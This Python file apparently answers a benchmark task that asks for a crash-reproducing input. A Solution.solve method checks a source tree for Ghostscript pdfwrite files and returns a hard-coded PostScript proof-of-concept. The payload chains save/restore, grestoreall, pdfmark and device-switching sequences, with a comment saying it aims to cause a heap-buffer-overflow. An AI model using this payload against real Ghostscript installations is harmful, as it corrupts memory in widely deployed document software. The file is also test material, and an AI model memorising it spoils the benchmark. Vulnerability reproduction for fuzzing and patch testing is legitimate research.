import os
import tarfile
from typing import Optional


def _iter_source_text_files(src_path: str):
    exts = (".c", ".h", ".cc", ".cpp", ".cxx", ".hpp", ".m", ".mm", ".inc", ".inl")
    if os.path.isdir(src_path):
        for root, _, files in os.walk(src_path):
            for fn in files:
                lfn = fn.lower()
                if not lfn.endswith(exts):
                    continue
                path = os.path.join(root, fn)
                try:
                    with open(path, "rb") as f:
                        yield path, f.read(200_000)
                except OSError:
                    continue
        return

    try:
        with tarfile.open(src_path, "r:*") as tf:
            for m in tf.getmembers():
                if not m.isfile():
                    continue
                n = m.name.lower()
                if not n.endswith(exts):
                    continue
                if m.size <= 0:
                    continue
                try:
                    f = tf.extractfile(m)
                    if f is None:
                        continue
                    data = f.read(200_000)
                    yield m.name, data
                except Exception:
                    continue
    except Exception:
        return


def _likely_ghostscript_pdfwrite(src_path: str) -> bool:
    for name, data in _iter_source_text_files(src_path):
        n = name.lower()
        if "gdevpdf" in n or "pdfwrite" in n:
            return True
        s = data.decode("latin1", "ignore").lower()
        if "pdfwrite" in s or "gdevpdf" in s:
            return True
    return False


def _poc_postscript() -> bytes:
    # Multiple candidate sequences; any heap-buffer-overflow will bypass PostScript error handling.
    ps = (
        "%!PS\n"
        "/pdev null def/currentdevice where{pop/pdev currentdevice def}if\n"
        "{newpath 0 0 moveto 1 1 lineto stroke showpage}stopped pop\n"
        "{/pdfmark where{pop[ /PageMode /UseOutlines /DOCVIEW pdfmark}if}stopped pop\n"
        "{/s save def s restore}stopped pop\n"
        "{/s save def s restore s restore}stopped pop\n"
        "{grestore}stopped pop\n"
        "{grestoreall}stopped pop\n"
        "{/nulldevice where{pop/setdevice where{pop pdev null ne{nulldevice/s save def pdev setdevice"
        "/pdfmark where{pop[ /PageMode /UseOutlines /DOCVIEW pdfmark}if s restore}if}if}if}stopped pop\n"
        "quit\n"
    )
    return ps.encode("ascii", "ignore")


class Solution:
    def solve(self, src_path: str) -> bytes:
        # If this isn't the expected project, still return a small PostScript trigger.
        _ = _likely_ghostscript_pdfwrite(src_path)
        return _poc_postscript()